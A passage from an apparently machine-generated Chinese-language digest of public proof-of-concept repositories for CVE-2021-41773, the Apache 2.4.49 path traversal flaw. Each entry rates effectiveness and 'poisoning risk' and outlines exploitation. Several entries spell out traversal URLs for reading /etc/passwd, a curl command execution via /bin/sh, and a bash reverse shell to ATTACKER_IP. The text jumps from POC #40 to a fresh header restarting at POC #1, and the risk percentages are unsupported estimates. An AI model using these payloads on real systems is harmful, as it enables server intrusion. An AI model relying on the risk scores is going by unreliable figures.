根据漏洞库信息和搜索引擎结果，CVE-2021-41773 是 Apache HTTP Server 2.4.49 版本中存在的路径遍历漏洞，且已被公开利用。搜索引擎结果显示该漏洞允许未经验证的攻击者访问敏感信息，甚至执行任意代码。漏洞库信息也证实了这一点，并指出该漏洞允许攻击者绕过 Alias 指令配置的目录限制，访问未受 "require all denied" 保护的文件。如果目标配置允许，还可能执行 CGI 脚本。

**投毒风险分析：**

提供的“漏洞利用代码”实际上包含两个文件：README.md 和 index.html。

*   **README.md：**  只是一个简单的文本文件，描述了该漏洞和远程代码执行。
*   **index.html：** 是由 pdf2htmlEX 生成的 HTML 文件，用于显示 PDF 内容。这个HTML 文件看起来是正常的，没有任何明显的恶意代码，它的作用仅仅是将PDF转换成了HTML，并没有什么可疑的js或者链接。

因此，提供的代码仓库中**没有**发现任何明显的投毒代码。 投毒风险极低，几乎为0%的可能性

**利用方式：**

利用 CVE-2021-41773 的基本方式是通过构造包含路径遍历字符（如`..%2f`）的 URL 来访问目标服务器上的任意文件。攻击者可以尝试以下步骤：

1.  **确定目标服务器是否运行 Apache HTTP Server 2.4.49。**
2.  **尝试使用路径遍历payload访问敏感文件，例如`/../../../../etc/passwd`。** 使用URL编码来绕过一些常见的安全过滤。
3.  **如果服务器配置允许，尝试执行任意 CGI 脚本。**  这通常涉及到上传恶意脚本并使用路径遍历漏洞来访问和执行它。

**漏洞利用的关键点：**

*   **Alias配置：**  该漏洞依赖于 Apache HTTP Server 的 Alias 指令配置不当。
*   **权限控制：**  被访问的文件必须没有受到 "require all denied" 的保护。
*   **CGI支持：**  如果开启了 CGI 支持，则可能导致远程代码执行。

**项目地址:** [jkska23/Additive-Vulnerability-Analysis-CVE-2021-41773](https://github.com/jkska23/Additive-Vulnerability-Analysis-CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #30

**来源**: [CVE-2021-41773-justakazh_mass_cve-2021-41773.md](../2021/CVE-2021-41773-justakazh_mass_cve-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未经身份验证的攻击者读取任意文件和/或执行远程代码

**影响版本:** 2.4.49

**利用条件:** 目标系统运行受影响的 Apache HTTP Server 版本，并配置了Alias指令或启用了CGI脚本执行

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

根据漏洞库信息、搜索结果和提供的漏洞利用代码，CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞，如果配置不当，可能导致远程代码执行。该漏洞允许攻击者通过构造包含特殊字符（如 URL 编码的 `%2e` 和 `%2e%2e`）的 URL，来访问服务器上受限目录之外的文件。

**有效性:**

根据漏洞库信息，该漏洞已在野外被利用。提供的 exploit-db 链接 (在 `mass_cve-2021-41773/README.md` 中) 也验证了这一点。提供的python脚本 `cve-2021-41773.py`  通过读取 `/etc/passwd` 文件来检测漏洞存在。另一个脚本 `cve-2021-41773_RCE.py` 尝试通过 cgi-bin 执行命令 `uname`，如果返回 `Linux` 或 `linux`，则认为存在 RCE 漏洞。

**投毒风险:**

检查提供的代码，没有发现明显的恶意或后门代码。所有的脚本都是为了验证漏洞的存在，而不是植入任何持久性的后门。`cve-2021-41773.py`  扫描目标然后保存结果, `cve-2021-41773_RCE.py`  是RCE验证脚本。`cve-2021-41773_manual.py` 允许手动指定命令执行. 因此投毒风险评估为0%。

**利用方式:**

1.  **路径遍历 (文件读取):**  攻击者发送一个精心构造的 HTTP GET 请求，其中包含经过 URL 编码的路径遍历字符，例如 `/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`。如果服务器存在漏洞且目录配置不当，服务器将返回 `/etc/passwd` 的内容。
2.  **远程代码执行 (RCE):**  如果服务器启用了 CGI 脚本执行，攻击者可以使用路径遍历来访问和执行任意脚本。`cve-2021-41773_RCE.py` 脚本通过POST请求向URL发送命令, 例如 `uname`，如果执行成功, 则判定可以RCE.  利用需要服务器配置支持 CGI 脚本，且目标路径没有 require all denied 配置。

**项目地址:** [justakazh/mass_cve-2021-41773](https://github.com/justakazh/mass_cve-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #31

**来源**: [CVE-2021-41773-khaidtraivch_CVE-2021-41773-Apache-2.4.49-.md](../2021/CVE-2021-41773-khaidtraivch_CVE-2021-41773-Apache-2.4.49-.md)

## CVE-2021-41773 Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可读取敏感文件并远程执行代码

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并且启用了CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

根据漏洞库信息、搜索结果和提供的漏洞利用代码，该漏洞利用具有较高的有效性。

**有效性：**

*   漏洞库明确指出该漏洞已被在野利用。
*   搜索结果显示该漏洞允许未经身份验证的攻击者读取敏感信息并执行任意代码。
*   提供的POC代码包含利用路径遍历读取`/etc/passwd`文件的脚本以及通过CGI执行反向shell的脚本，证明了漏洞的可利用性。

**投毒风险：**

虽然POC代码本身实现了明确的漏洞利用功能，但考虑到其来源的安全性无法完全保证，仍存在潜在的投毒风险。具体分析如下：

*   代码的功能相对简单直接，主要依赖于`curl`命令发送HTTP请求。潜在的投毒方式可能包括：
    *   **变量替换：** 攻击者可能尝试修改`TARGET_IP`或`ATTACKER_IP`变量，将利用流量引导至恶意服务器。
    *   **命令注入：** 攻击者可能尝试通过修改`URL`或`POST`数据中的参数，实现命令注入，从而执行恶意代码。虽然在提供的代码中直接注入恶意代码的难度较高，但仍然不能完全排除这种可能性。
    *   **依赖库问题：** 虽然POC主要依赖`curl`和`bash`，但如果运行环境存在其他未知的依赖库，可能存在通过这些依赖库进行投毒的风险。

由于代码较为简短，且功能较为直接，恶意代码隐藏的空间有限。因此，投毒风险相对较低，估计在10%左右。

**利用方式：**

该漏洞的利用方式如下：

1.  **路径遍历：** 利用Apache HTTP Server 2.4.49在路径规范化方面的缺陷，通过构造包含`.%2e`的URL，绕过Alias-like指令的限制，访问服务器上的任意文件。如果目标文件没有被"require all denied"等配置保护，则可以成功读取文件内容，例如`/etc/passwd`。
2.  **远程代码执行：** 如果服务器配置允许CGI脚本执行，攻击者可以通过构造特殊的HTTP POST请求，将恶意代码作为CGI脚本的输入，从而在服务器上执行任意命令。例如，可以使用`bash -i >& /dev/tcp/$ATTACKER_IP/$PORT 0>&1`命令建立反向shell，从而完全控制目标服务器。

**防范措施：**

*   升级到Apache HTTP Server 2.4.50或更高版本。
*   配置"require all denied"，限制对敏感文件的访问。
*   禁用不必要的CGI脚本执行。
*   监控服务器日志，及时发现异常请求。

**项目地址:** [khaidtraivch/CVE-2021-41773-Apache-2.4.49-](https://github.com/khaidtraivch/CVE-2021-41773-Apache-2.4.49-)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #32

**来源**: [CVE-2021-41773-luongchivi_CVE-2021-41773.md](../2021/CVE-2021-41773-luongchivi_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可导致敏感信息泄露和远程代码执行 (Remote Code Execution, RCE)

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且Alias指令配置不当，未对外部文件目录进行访问限制。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中存在的路径遍历漏洞。攻击者可以通过构造包含`/.%2e`或`/%2e%2e`等特殊序列的URL，绕过服务器的路径规范化检查，从而访问Alias指令配置之外的文件。

**有效性：**
提供的Dockerfile和docker-compose.yml文件用于搭建存在CVE-2021-41773漏洞的Apache HTTP Server 2.4.49环境。README.md中提供了利用该漏洞读取`/etc/passwd`文件的POC，验证了漏洞的有效性。搜索引擎结果也表明该漏洞可以被利用来进行路径遍历和远程代码执行。

**投毒风险：**
Dockerfile仅仅是从官方镜像拉取存在漏洞的镜像并复制httpd.conf，httpd.conf是基本的apache配置，没有恶意代码。docker-compose文件只是启动docker。
文件分析结果如下：
*   **Dockerfile:**  该文件用于构建包含漏洞版本的Apache镜像，没有发现恶意行为。
*   **README.md:**  该文件提供了漏洞的POC，用于验证漏洞，其中包含的命令用于读取`/etc/passwd`等文件，属于漏洞利用行为，而非投毒。
*   **docker-compose.yml:**  该文件用于配置和启动Docker容器，没有发现恶意行为。
*   **httpd.conf:**  配置文件为apache的默认配置, 没有恶意行为
虽然没发现明显的恶意代码，但如果使用者不了解漏洞原理，直接部署该环境，可能会造成安全风险。因此，存在极低的投毒风险，约5%。

**利用方式：**
1.  攻击者构造恶意的URL，其中包含`/.%2e`或`/%2e%2e`等序列，用于绕过路径规范化检查。
2.  URL指向`/cgi-bin/`目录下的文件，并利用路径遍历访问目标文件，例如`/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd`。
3.  如果服务器配置允许执行CGI脚本，攻击者甚至可以利用该漏洞执行任意代码，例如通过POST请求传递恶意代码到目标文件。

**修复建议：**
1.  升级到Apache HTTP Server 2.4.50或更高版本。
2.  在Apache配置文件中，对根目录`/`设置`Require all denied`，防止未授权访问。

**项目地址:** [luongchivi/CVE-2021-41773](https://github.com/luongchivi/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #33

**来源**: [CVE-2021-41773-mah4nzfr_CVE-2021-41773.md](../2021/CVE-2021-41773-mah4nzfr_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且启用了 cgi-bin 目录，Alias配置不当，存在文件系统权限问题。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

根据漏洞库信息和搜索结果，CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 版本中。该漏洞是由于路径规范化处理的缺陷导致的路径遍历漏洞，攻击者可以利用该漏洞访问服务器上受限目录之外的文件。如果服务器的 Alias 配置不当，并且文件系统权限设置不合理，攻击者甚至可以通过上传恶意 CGI 脚本来实现远程代码执行。

**有效性：**
提供的 POC 代码看起来是有效的。它利用了路径遍历漏洞，尝试访问 `/bin/sh` 可执行文件，并通过 POST 请求传递包含反向 shell 命令的 DATA。`--path-as-is` 选项确保 curl 不会对 URL 进行规范化，从而允许路径遍历。

**投毒风险：**
漏洞利用代码本身看起来比较直接，目的是触发一个反向shell。`LICENSE`文件正常。
检查以下内容：
1.  **代码混淆：** 代码没有被混淆。
2.  **隐藏命令：** 没有发现隐藏或混淆的命令。
3.  **依赖项：**  该脚本不依赖于任何外部文件或库。
4.  **作者信誉：**  作者的github需要进一步评估，但目前从代码本身看不出明显的恶意。
综合评估，存在投毒代码的可能性较低，估计为 10%。风险主要在于如果攻击成功，攻击者能够在目标系统上执行任意命令，这本身就构成了极大的安全风险。

**利用方式：**
1.  **路径遍历：**  利用 `/.%2e/%2e%2e/` 序列绕过 Apache 的路径访问限制。
2.  **CGI 执行：**  如果 `cgi-bin` 目录已启用，攻击者可以将请求指向该目录。
3.  **反向 Shell：**  通过 POST 请求，攻击者传递一个包含反向 shell 命令的字符串，该命令会在服务器上执行，从而使攻击者获得对服务器的远程访问权限。
4. **payload构造:** 首先构造畸形的URL, 包含`/.%2e/%2e%2e/` 序列, 并指定到系统程序`/bin/sh`, 通过`POST`方法,将需要执行的代码注入到`DATA`变量中.

**总结：**
CVE-2021-41773 是一个严重的安全漏洞，可以被利用进行路径遍历和远程代码执行。提供的 POC 代码可以有效利用此漏洞，但是务必在授权的情况下进行测试。代码本身投毒风险较低，但成功利用漏洞后的风险极高。

**项目地址:** [mah4nzfr/CVE-2021-41773](https://github.com/mah4nzfr/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #34

**来源**: [CVE-2021-41773-mightysai1997_CVE-2021-41773-PoC.md](../2021/CVE-2021-41773-mightysai1997_CVE-2021-41773-PoC.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可导致文件泄露，甚至远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，且Alias配置的目录未启用 "require all denied" 保护，CGI脚本需要启用。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49版本中存在的路径遍历漏洞。攻击者可以利用该漏洞，通过构造包含特殊字符的URL，绕过Alias指令的限制，访问服务器上未授权的文件。如果目标服务器同时启用了CGI脚本支持，则攻击者可能进一步利用此漏洞执行任意代码。

**有效性：**

根据漏洞库信息、搜索结果和漏洞利用代码，可以判断该漏洞的POC代码是有效的。漏洞库中明确指出此漏洞已被在野利用。搜索引擎结果也显示了POC的存在和利用方式。

**投毒风险：**

提供的Dockerfile中，核心操作是：

1.  `FROM httpd:2.4.49`:  指定基础镜像为httpd:2.4.49，这是一个官方镜像，降低了投毒的可能性。
2.  `RUN sed -i 's/Require all denied/# Require all denied/g' /usr/local/apache2/conf/httpd.conf`:  这行代码将httpd.conf文件中的`Require all denied`注释掉。这正是为了使漏洞更容易被利用。如果没有这一行，即使存在路径遍历，也无法读取到未授权的文件（因为默认是拒绝所有访问）。这部分不是投毒，而是为了方便漏洞验证。
其他文件是`LICENSE`，仅包含Apache License 2.0的文本，不涉及任何恶意代码。

因此，直接的恶意投毒代码的可能性较低，但该Dockerfile的意图是创造一个存在漏洞的环境，以便更容易地利用漏洞。该仓库本身并没有主动植入恶意代码，而是提供了一个方便利用漏洞的环境。考虑到该行为可能被恶意利用，判定存在10%的投毒风险，因为此Dockerfile的目的是为了移除安全防护，为攻击者降低利用门槛。

**利用方式：**

1.  **路径遍历：** 攻击者构造包含`..%2f`的URL，尝试访问受限目录之外的文件。`%2f`是`/`的URL编码，`..`表示上一级目录。多次使用`..%2f`可以突破目录限制。
2.  **文件读取：** 如果成功绕过限制，攻击者可以读取服务器上的任意文件，例如配置文件、源代码等。
3.  **远程代码执行 (RCE)：** 如果目标服务器启用了CGI，攻击者可以通过上传恶意CGI脚本并执行，实现远程代码执行。利用路径遍历，将请求发送到位于服务器文件系统上的CGI脚本，从而执行任意命令。

例如，攻击者可以使用如下URL读取`/etc/passwd`文件：

`http://target/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd`

如果启用了CGI，攻击者可以尝试利用路径遍历访问并执行CGI脚本，例如：

`http://target/cgi-bin/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fpath/to/malicious.cgi`

**项目地址:** [mightysai1997/CVE-2021-41773-PoC](https://github.com/mightysai1997/CVE-2021-41773-PoC)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #35

**来源**: [CVE-2021-41773-mightysai1997_CVE-2021-41773-i-.md](../2021/CVE-2021-41773-mightysai1997_CVE-2021-41773-i-.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可导致敏感信息泄露或远程代码执行 (取决于配置)

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行 Apache HTTP Server 2.4.49，且 Alias 指令配置不当或 CGI 脚本启用。需要可以发送 HTTP 请求的网络访问。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中存在的一个路径遍历漏洞。该漏洞源于 Apache HTTP Server 在路径规范化方面存在缺陷，攻击者可以利用该漏洞将 URL 映射到 Alias 指令配置目录之外的文件。如果这些目录之外的文件没有受到 "require all denied" 等默认配置的保护，请求就可以成功。如果为这些 Aliased 路径启用了 CGI 脚本，则可能导致远程代码执行。

**漏洞利用方式：**

攻击者通过构造包含特殊编码（如 `%2e`）的路径的 HTTP 请求，绕过 Apache HTTP Server 的路径检查，从而访问受限目录之外的文件。例如，`GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd HTTP/1.1` 这样的请求可以尝试读取服务器上的 `/etc/passwd` 文件。

根据提供的 Dockerfile 和 README.md，PoC 的有效性依赖于两个关键步骤：

1.  **Dockerfile:** 使用 `httpd:2.4.49` 镜像，确保存在漏洞的 Apache 版本。
2.  **httpd.conf:**  修改 `httpd.conf` 文件，将 `<Directory />` 部分的 `Require all denied` 更改为 `Require all granted`。这一步**至关重要**，因为 `Require all denied` 配置会阻止对根目录的访问，从而阻止漏洞利用。如果未修改此配置，即使存在漏洞，也无法读取文件。

**投毒风险分析：**

分析提供的 Dockerfile 和 httpd.conf 文件，发现投毒代码的风险较低，估计为 5%。主要风险在于以下可能性：

*   **`httpd.conf` 修改的误导性:**  虽然 README.md 中明确说明了修改 `Require all denied` 的原因，但如果用户盲目复制粘贴配置文件，可能会在无意中降低服务器的安全性。
*   **CGI脚本的滥用:** 虽然PoC本身不包含恶意CGI脚本，但如果服务器上存在未授权或存在漏洞的CGI脚本，攻击者可能会利用该漏洞执行恶意代码。

总体来说，该 PoC 主要用于演示漏洞，但使用者应该意识到其潜在的安全风险。

**项目地址:** [mightysai1997/CVE-2021-41773-i-](https://github.com/mightysai1997/CVE-2021-41773-i-)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #36

**来源**: [CVE-2021-41773-mightysai1997_CVE-2021-41773S.md](../2021/CVE-2021-41773-mightysai1997_CVE-2021-41773S.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 & 远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未授权的攻击者访问敏感信息，甚至执行任意代码。

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并且配置允许CGI脚本执行或者存在Alias-like指令的配置。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 版本中存在的一个路径遍历漏洞。攻击者可以利用该漏洞，通过构造特殊的 URL，绕过 Alias-like 指令的限制，访问服务器上受限目录之外的文件。如果服务器同时启用了 CGI 脚本执行，攻击者还可以通过该漏洞执行任意代码。

**有效性：**

提供的 PoC 代码是有效的。通过发送包含 URL 编码的路径遍历字符的 HTTP 请求，可以读取`/etc/passwd`等敏感文件，或者如果启用了 CGI，则可以执行系统命令。

例如，使用 `curl http://localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd` 可以尝试读取`/etc/passwd`文件。
如果服务器配置允许 CGI 执行，使用 `curl 'localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' -d 'A=|echo;id'` 可以在服务器上执行 `id` 命令。

**投毒风险：**

查看提供的 Dockerfile 和 httpd.conf 文件，未发现明显的恶意代码。`blueteamsteve` 提供的 Docker 镜像配置目的是为了复现漏洞，使得利用更加方便。虽然代码本身没有恶意，但如果攻击者修改 Dockerfile 或者 httpd.conf 文件，加入恶意代码并重新构建镜像，可能会存在投毒风险。从现有信息判断，代码本身投毒风险极低，给出1%的概率。 

**利用方式：**

1.  **路径遍历：** 攻击者通过构造包含`/.%2e/.%2e/`的特殊 URL，尝试访问服务器上的任意文件。`%2e` 是`.`的 URL 编码，用于绕过某些安全限制。
2.  **远程代码执行（RCE）：** 如果服务器启用了 CGI 脚本，攻击者可以通过路径遍历访问到 `/bin/sh` 等 shell 程序，并执行任意命令。

为了成功利用该漏洞，目标服务器需要满足以下条件：

*   运行 Apache HTTP Server 2.4.49 版本。
*   服务器的配置存在 Alias-like 指令，且对受限目录之外的文件没有进行严格的访问控制。
*   可选：服务器启用了 CGI 脚本执行。

**项目地址:** [mightysai1997/CVE-2021-41773S](https://github.com/mightysai1997/CVE-2021-41773S)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #37

**来源**: [CVE-2021-41773-mightysai1997_CVE-2021-41773h.md](../2021/CVE-2021-41773-mightysai1997_CVE-2021-41773h.md)

## CVE-2021-41773-Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行受影响的 Apache HTTP Server 版本，并且 Alias 指令配置不当，允许访问受限目录之外的文件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞。攻击者可以利用该漏洞，通过构造包含特殊字符的 URL，绕过 Alias 指令的限制，访问服务器上未授权的文件。如果服务器配置允许 CGI 脚本在这些 aliased 路径下执行，则攻击者可能进一步实现远程代码执行。

**有效性分析：**

根据漏洞库信息和搜索结果，CVE-2021-41773 在野外已被利用。提供的 Dockerfile 使用了 `httpd:2.4.49-alpine` 镜像，明确指定了受影响的 Apache 版本。Dockerfile 下载并替换了默认的 `httpd.conf` 配置文件。如果这个 `httpd.conf` 配置不安全，例如没有正确的 `Require all denied` 规则，那么漏洞利用将是有效的。综上所述，该POC的有效性较高，但依赖于 `httpd.conf` 的具体内容。

**投毒风险分析：**

提供的文件列表中，`LICENSE` 文件是标准的 Apache 许可证，没有投毒风险。Dockerfile本身只包含下载配置文件和替换配置文件的操作。投毒风险主要在于从 `https://raw.githubusercontent.com/itsecurityco/CVE-2021-41773/main/httpd.conf` 下载的 `httpd.conf` 文件。攻击者可能会修改该文件，例如：

*   **放宽访问限制：**  允许访问敏感目录，例如 `/var/www/html` 之外的目录。
*   **配置恶意 CGI 脚本：**  允许执行任意代码。
*   **植入后门：**  在配置文件中添加恶意指令，例如通过 mod_rewrite 实现后门访问。

由于无法直接分析远程 `httpd.conf` 文件的内容，因此存在一定的投毒风险。 这里估计投毒风险为 10%，因为该项目看起来是为了演示漏洞，不太可能包含恶意代码，但仍然需要谨慎。

**利用方式分析：**

利用方式主要通过构造恶意的 HTTP GET 请求，其中包含经过 URL 编码的路径遍历字符。例如，可以使用 `%2e%2e/` 或 `%252e%252e/` 来绕过路径规范化，访问目标目录之外的文件。

例如，如果目标服务器存在以下 Alias 配置：

```
Alias /images /var/www/images
```

攻击者可以使用以下 URL 访问 `/etc/passwd` 文件：

```
GET /images/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
```

如果 CGI 脚本已启用，则可以构造包含恶意代码的 CGI 脚本，并通过路径遍历漏洞执行它，从而实现远程代码执行。

**项目地址:** [mightysai1997/CVE-2021-41773h](https://github.com/mightysai1997/CVE-2021-41773h)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #38

**来源**: [CVE-2021-41773-psibot_apache-vulnerable.md](../2021/CVE-2021-41773-psibot_apache-vulnerable.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal 和 RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal, Remote Code Execution (RCE)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49 或 2.4.50，且配置允许CGI脚本执行，部分Alias目录未进行 require all denied 限制。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 版本中，是一个路径遍历漏洞。攻击者可以通过构造包含恶意路径的URL，绕过 Alias 指令配置的目录限制，访问服务器上的任意文件，如果目标开启了CGI支持，攻击者可以通过构造恶意请求执行任意代码。该漏洞利用的关键在于路径规范化处理的缺陷，允许攻击者使用 `/.%2e` 绕过限制。

**有效性：**
根据漏洞描述和提供的漏洞利用代码，可以判定该POC代码是有效的。漏洞库信息、搜索引擎结果和漏洞利用代码都确认了该漏洞的存在以及利用方式。Nuclei模板可以用来检测目标服务器是否存在漏洞，而curl命令的POC则直接利用了路径遍历读取 `/etc/passwd` 文件。

**投毒风险：**
提供的代码仓库主要包含Nuclei的YAML模板文件和一个README.md文件。Nuclei模板主要用于漏洞检测，本身不具备直接植入后门的能力。投毒风险主要集中在以下几个方面：
1.  **模板逻辑修改：** 攻击者可能修改模板的匹配规则，使得原本不存在漏洞的服务器也被误判为存在漏洞，从而误导用户进行后续操作。
2.  **模板Payload替换：**  攻击者可能在模板中替换恶意的payload，例如，将读取`/etc/passwd` 替换为执行恶意命令的payload。但提供的模板中直接包含RCE利用，风险相对较小
3.  **依赖库劫持：** 虽然Nuclei本身是安全的，但如果用户使用的Nuclei版本存在依赖库劫持的风险，攻击者可能通过替换Nuclei的依赖库来执行恶意代码。但此风险与本仓库代码关系不大。

因此，综合考虑，该仓库存在一定的投毒风险，但主要集中在Nuclei模板的修改上，而不是直接包含恶意代码。 风险占比10%。

**利用方式：**
1.  **路径遍历（文件读取）：** 攻击者构造包含 `/.%2e/%2e%2e/%2e%2e/%2e%2e/` 序列的URL，尝试读取服务器上的任意文件，例如 `/etc/passwd`。
2.  **远程代码执行 (RCE)：**  如果服务器启用了CGI，攻击者可以通过路径遍历访问到CGI脚本，并通过构造特殊的请求来执行任意命令。具体方法通常依赖于服务器的具体配置和CGI脚本的编写方式。

**项目地址:** [psibot/apache-vulnerable](https://github.com/psibot/apache-vulnerable)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #39

**来源**: [CVE-2021-41773-r0otk3r_CVE-2021-41773.md](../2021/CVE-2021-41773-r0otk3r_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49 和 2.4.50 (CVE-2021-42013是对CVE-2021-41773的不完全修复)

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，可能需要CGI模块启用，以及Alias配置不当。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49中的一个路径遍历漏洞。攻击者可以利用此漏洞，通过构造特殊的URL，绕过Alias等指令的限制，访问服务器上的任意文件。如果服务器同时启用了CGI，则可能进一步导致远程代码执行。漏洞利用代码`exploit.py`提供LFI(本地文件包含)和RCE(远程代码执行)两种攻击模式。LFI模式通过构造包含`/.%2e`序列的URL，读取服务器上的文件。RCE模式利用CGI执行命令，通过POST请求发送包含命令的Payload。

**漏洞利用方式：**

1.  **路径遍历 (LFI)：** 攻击者构造包含`/.%2e/%2e%2e`序列的URL，尝试访问受限目录之外的文件，例如`/etc/passwd`。  该漏洞利用代码中的payload1和payload2就是用于此目的，通过拼接路径来尝试读取目标文件。
2.  **远程代码执行 (RCE)：** 如果目标服务器启用了CGI，攻击者可以利用路径遍历漏洞，访问CGI脚本目录，并通过POST请求执行任意命令。漏洞利用代码中的payload3就是用于指定CGI脚本的位置，然后通过构造POST请求，在data中包含要执行的命令。

**关于投毒风险：**
该漏洞利用代码 `exploit.py` 本身看起来比较直接，目的是利用该漏洞。存在投毒的可能性较低，但仍不能完全排除，比如作者可以在交互式shell部分加入一些后门代码,或者在payload中加入恶意指令。经过分析，判断存在10%的投毒风险。`README.md`文件看起来也比较标准，风险较低。

**搜索引擎结果：**
搜索引擎结果表明该漏洞确实存在，且已被广泛利用。多个文章指出该漏洞可以导致敏感信息泄露和远程代码执行。

**项目地址:** [r0otk3r/CVE-2021-41773](https://github.com/r0otk3r/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #40

**来源**: [CVE-2021-41773-redspy-sec_CVE-2021-41773.md](../2021/CVE-2021-41773-redspy-sec_CVE-2021-41773.md)

# CVE-2021-41773

> 📦 该CVE有 **43** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2021-41773-0xGabe_Apache-CVEs.md](../2021/CVE-2021-41773-0xGabe_Apache-CVEs.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，并且CGI脚本已启用。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

